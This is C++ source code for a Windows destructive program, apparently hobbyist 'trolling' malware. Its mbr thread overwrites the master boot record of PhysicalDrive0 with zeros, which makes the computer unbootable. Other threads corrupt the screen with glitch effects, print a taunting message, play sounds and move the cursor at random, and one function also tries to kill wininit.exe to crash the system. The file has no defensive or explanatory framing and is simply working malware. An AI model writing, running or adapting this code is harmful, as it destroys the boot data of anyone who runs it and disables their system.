define MBR_SIZE 512
#include <Windows.h>
#include <time.h>
#include <iostream>
#include <stdio.h>

#define MYRGB(r, g, b) (r | g << 8 | b << 16)

using namespace std;

DWORD WINAPI sharpness(LPVOID lpstart)
{
    HDC desk = GetDC(0);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (1) {
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 75, rand() % 75, rand() % 75));
        SelectObject(desk, brush);
        PatBlt(desk, 0, 0, w, h, PATINVERT);
        Sleep(rand() % 1000);
    }
}
DWORD WINAPI idk(LPVOID lpstart)
{
    HDC desk = GetDC(0);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (1) {
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(desk, brush);
        BitBlt(desk, rand() % 10, rand() % 10, w, h, desk, rand() % 10, rand() % 10, 0x98123c);
        Sleep(1);
    }
}

DWORD WINAPI payload2(LPVOID lpstart) {
    HDC desk = GetDC(0);
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    while (1)
    {
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(desk, brush);
        LineTo(desk, rand() % w, rand() % h);
        RoundRect(desk, rand() % w, rand() % h, rand() % w, rand() % h, rand() % w, rand() % h);
        Sleep(100);
    }
}

void rS1(int counter)
{
    HDC desk = GetDC(0);
    RECT wRect;

    POINT wPt[3];

    GetWindowRect(GetDesktopWindow(), &wRect);

    wPt[0].x = wRect.left + counter;
    wPt[0].y = wRect.top - counter;

    wPt[1].x = wRect.right + counter;
    wPt[1].y = wRect.top + counter;

    wPt[2].x = wRect.left - counter;
    wPt[2].y = wRect.bottom - counter;

    PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
}
void rS2(int counter)
{
    HDC desk = GetDC(0);
    RECT wRect;

    POINT wPt[3];

    GetWindowRect(GetDesktopWindow(), &wRect);

    wPt[0].x = wRect.left - counter;
    wPt[0].y = wRect.top + counter;

    wPt[1].x = wRect.right - counter;
    wPt[1].y = wRect.top - counter;

    wPt[2].x = wRect.left + counter;
    wPt[2].y = wRect.bottom + counter;

    PlgBlt(desk, wPt, desk, wRect.left, wRect.top, wRect.right - wRect.left, wRect.bottom - wRect.top, 0, 0, 0);
}

DWORD WINAPI glitch(LPVOID lpstart) {
    while (1)
    {
        rS1(rand() % 15);
        rS2(rand() % 10);
        Sleep(rand() % 100);
    }
}

DWORD WINAPI glitch2(LPVOID lpstart) {
    HWND upWnd = GetForegroundWindow();
    HDC upHdc = GetDC(upWnd);
    HDC desktop = GetDC(NULL);
    int xs = GetSystemMetrics(SM_CXSCREEN);
    int ys = GetSystemMetrics(SM_CYSCREEN);
    while (true) {
        upWnd = GetForegroundWindow();
        desktop = GetDC(NULL);
        upHdc = GetDC(upWnd);
        BitBlt(desktop, 0, 0, xs, ys, upHdc, 0, 0, PATINVERT);
    }
}

DWORD WINAPI glitch3(LPVOID lpstart) {
    while (true) {
        HWND desktop = GetDesktopWindow();
        HDC desk = GetDC(NULL);
        RECT rect;
        GetWindowRect(desktop, &rect);
        int w = rect.right - rect.left;
        int h = rect.bottom - rect.top;
        StretchBlt(desk, 50, 50, w - 100, h - 100, desk, 0, 0, w, h, SRCCOPY);
        Sleep(300);
    }
}

DWORD WINAPI ojf(LPVOID plvd)
{
    HDC Hdc = GetDC(0);
    HWND hwnd = GetDesktopWindow();
    RECT rect;
    while (true)
    {
        GetWindowRect(hwnd, &rect);
        int r = rand() % 2;
        GetWindowRect(hwnd, &rect);
        if (r == 1)
        {
            StretchBlt(Hdc, 0, 0, rect.right, rect.bottom, Hdc, 5, 5, rect.right - 10, rect.bottom - 10, SRCPAINT);
        }
        else if (r == 2)
        {
            StretchBlt(Hdc, 5, 5, rect.right - 10, rect.bottom - 10, Hdc, 0, 0, rect.right, rect.bottom, SRCPAINT);
        }
    }
}

DWORD WINAPI mbr(LPVOID lpstart) {
    int X, Y;
    char mbrData[512];

    ZeroMemory(&mbrData, (sizeof mbrData));
    
    HANDLE MBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
    DWORD write;
    WriteFile(MBR, mbrData, 512, &write, NULL);

    while (true) {
        srand(time(NULL));
        X = rand() % 801;
        Y = rand() % 601;
        SetCursorPos(X, Y);
    }

    CloseHandle(MBR);
}

DWORD WINAPI textout(LPVOID lpstart) {
    HDC hdc;
    int sx = 0, sy = 0;
    LPCWSTR lpText = L"damn, nice kompiuter but trashed";

    while (true) {
        hdc = GetWindowDC(GetDesktopWindow());
        sx = GetSystemMetrics(0);
        sy = GetSystemMetrics(1);
        SetTextColor(hdc, MYRGB(3, 44, 55));
        SetBkColor(hdc, MYRGB(500, 255, 5));
        TextOutW(hdc,
            rand() % sx,
            rand() % sy,
            lpText,
            wcslen(lpText)
        );
        Sleep(10);
    }
}

DWORD WINAPI shutdown(LPVOID lpstart) {
    HDC hdc = GetDC(0);
    while (1) {
        InvertRgn(hdc, CreateEllipticRgn(rand() % 1920, rand() % 1920, rand() % 1080, rand() % 1080));
    }

    Sleep(100);

    system("taskkill /f /im wininit.exe");
}

DWORD WINAPI sound(LPVOID lpstart) {
    const char* sounds[] = {
        "SystemHand",
        "SystemExcalamtion",
        "SystemQuestion",
        "SystemStart",
        "SystemExit",
        "SystemAsterisk"
    };
    while (true)
    {
        PlaySoundA(sounds[rand() % (sizeof(sounds) / sizeof(sounds[0]))], 0, SND_ASYNC);
        Sleep(20);
        Beep(rand() % 1560, rand() % 1589);
        PlaySoundA("sound.wav", NULL, SND_ASYNC);
        Sleep(rand() % 300);
    }
}

int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpSzCmdLine, int nCmdShow)
{
    CreateThread(0, 0, mbr, 0, 0, 0);
    CreateThread(0, 0, sound, 0, 0, 0);
    CreateThread(0, 0, payload2, 0, 0, 0);
    CreateThread(0, 0, textout, 0, 0, 0);
    CreateThread(0, 0, sharpness, 0, 0, 0);
    CreateThread(0, 0, idk, 0, 0, 0);
    CreateThread(0, 0, ojf, 0, 0, 0);
    Sleep(5);
    CreateThread(0, 0, glitch, 0, 0, 0);
    CreateThread(0, 0, glitch2, 0, 0, 0);
    CreateThread(0, 0, glitch3, 0, 0, 0);
    Sleep(10);
    CreateThread(0, 0, shutdown, 0, 0, 0);
    while (1) {}
}
